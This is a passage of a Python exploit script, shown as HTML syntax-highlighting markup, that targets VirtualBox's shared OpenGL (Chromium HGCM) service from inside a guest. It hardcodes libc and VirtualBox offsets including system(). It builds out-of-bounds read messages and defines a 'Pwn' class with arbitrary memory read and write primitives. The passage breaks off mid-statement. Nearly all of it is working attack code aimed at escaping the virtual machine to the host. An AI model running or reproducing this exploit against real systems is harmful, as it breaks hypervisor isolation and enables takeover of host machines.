&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hgcm&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20890&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;vbox_puts_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x22f0f0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc_puts_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x809c0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc_system_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4f440&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_GETUNIFORMLOCATION_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;LEET&#39;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Set pHostBuffer and cbHostBuffer, then read from the Chromium stream.&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_HOSTBUFSZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_READ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&amp;lt;Q&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
        &lt;span class=&quot;sd&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;        msg2= pack(&quot;&amp;lt;III&quot;, CR_MESSAGE_OPCODES, 0x41414141, 1) \&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;              + &#39;\0\0\0&#39; + chr(CR_EXTEND_OPCODE) \&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;              + &#39;aaaa&#39; \&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;              + pack(&quot;&amp;lt;I&quot;, CR_SHADERSOURCE_EXTEND_OPCODE) \&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;              + pack(&quot;&amp;lt;IIIII&quot;, 0, 0x2, 0, 0x1, 0x1a+2) +&#39;A&#39;*4&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;        &#39;&#39;&#39;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
